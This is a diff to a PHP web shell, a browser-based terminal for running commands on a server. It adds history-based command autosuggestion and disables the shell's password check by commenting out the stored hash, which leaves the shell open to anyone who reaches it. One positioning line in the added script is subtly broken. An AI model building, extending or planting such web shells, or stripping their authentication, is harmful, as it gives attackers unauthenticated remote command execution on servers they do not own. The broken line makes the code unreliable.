@@ -5,7 +5,7 @@ session_start();
 // Generate password's hash with
 // php -r "echo password_hash('yourstrongpassword', PASSWORD_DEFAULT );"
 // Comment to remove password protection
-$PASSWD = '$2y$10$xTVjPTvVllWTgjf3YBlK7OmJiP9YG/aml5bCJdbFiS41LKAqyquBa'; 
+// $PASSWD = '$2y$10$xTVjPTvVllWTgjf3YBlK7OmJiP9YG/aml5bCJdbFiS41LKAqyquBa'; 
 
 function isAuthenticated() {
     return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
@@ -455,10 +455,21 @@ if (isset($_GET["feature"])) {
             #shell-input div {
                 flex-grow: 1;
                 align-items: stretch;
+                position: relative;
             }
 
             #shell-input input {
                 outline: none;
+            }
+
+            #shell-suggestion {
+                position: absolute;
+                pointer-events: None;
+                font-family: monospace;
+                font-size: 10pt;
+                line-height: 30px;
+                white-space: pre;
+                left:1px;
             }
         </style>
 
@@ -470,6 +481,7 @@ if (isset($_GET["feature"])) {
             var historyPosition = 0;
             var eShellCmdInput = null;
             var eShellContent = null;
+            var suggestedCommand = "";
 
             function _insertCommand(command) {
                 eShellContent.innerHTML += "\n\n";
@@ -624,12 +636,14 @@ if (isset($_GET["feature"])) {
                         featureShell(eShellCmdInput.value);
                         insertToHistory(eShellCmdInput.value);
                         eShellCmdInput.value = "";
+                        clearSuggestion();
                         break;
                     case "ArrowUp":
                         if (historyPosition > 0) {
                             historyPosition--;
                             eShellCmdInput.blur();
                             eShellCmdInput.value = commandHistory[historyPosition];
+                            clearSuggestion();
                             _defer(function() {
                                 eShellCmdInput.focus();
                             });
@@ -647,11 +661,26 @@ if (isset($_GET["feature"])) {
                             eShellCmdInput.focus();
                             eShellCmdInput.value = commandHistory[historyPosition];
                         }
+                        clearSuggestion();
+                        break;
+                    case "ArrowRight":
+                        if (eShellCmdInput.selectionStart === eShellCmdInput.value.length && suggestedCommand) {
+                            event.preventDefault();
+                            eShellCmdInput.value = suggestedCommand;
+                            clearSuggestion();
+                        }
                         break;
                     case 'Tab':
                         event.preventDefault();
-                        featureHint();
+                        if (suggestedCommand) {
+                            eShellCmdInput.value = suggestedCommand;
+                            clearSuggestion();
+                        } else {
+                            featureHint();
+                        }
                         break;
+                    default:
+                        _defer(updateSuggestion);
                 }
             }
 
@@ -682,6 +711,39 @@ if (isset($_GET["feature"])) {
                 } catch (e) {
                     console.error('Failed to load history:', e);
                     commandHistory = [];
+                }
+            }
+
+            function updateSuggestion() {
+                var currentValue = eShellCmdInput.value;
+                if (!currentValue.trim()) {
+                    clearSuggestion();
+                    return;
+                }
+                for (var i = commandHistory.length - 1; i >= 0; i--) {
+                    if (commandHistory[i].startsWith(currentValue) && commandHistory[i] !== currentValue) {
+                        suggestedCommand = commandHistory[i];
+                        displaySuggestion(currentValue, commandHistory[i]);
+                        return;
+                    }
+                }
+                clearSuggestion();
+            }
+
+            function displaySuggestion(typed, suggestion) {
+                var suggestionSpan = document.getElementById("shell-suggestion");
+                var remaining = suggestion.substring(typed.length);
+                suggestionSpan.innerHTML = '<span style="opacity: 0;">' + escapeHtml(typed) + '</span><span style="color: rgba(238, 238, 238, 0.3);">' + escapeHtml(remaining) + '</span>';
+                suggestionSpan.style.left = eShellCmdInput.offsetLeft + "2px";
+                suggestionSpan.style.top = eShellCmdInput.offsetTop + "px";
+                suggestionSpan.style.height = "30px";
+            }
+
+            function clearSuggestion() {
+                suggestedCommand = "";
+                var suggestionSpan = document.getElementById("shell-suggestion");
+                if (suggestionSpan) {
+                    suggestionSpan.textContent = "";
                 }
             }
 
@@ -758,6 +820,7 @@ if (isset($PASSWD) && strlen($PASSWD)) {
                 <label for="shell-cmd" id="shell-prompt" class="shell-prompt">???</label>
                 <div>
                     <input id="shell-cmd" name="cmd" onkeydown="_onShellCmdKeyDown(event)"/>
+                    <span id="shell-suggestion"></span>
                 </div>
             </div>
         </div>
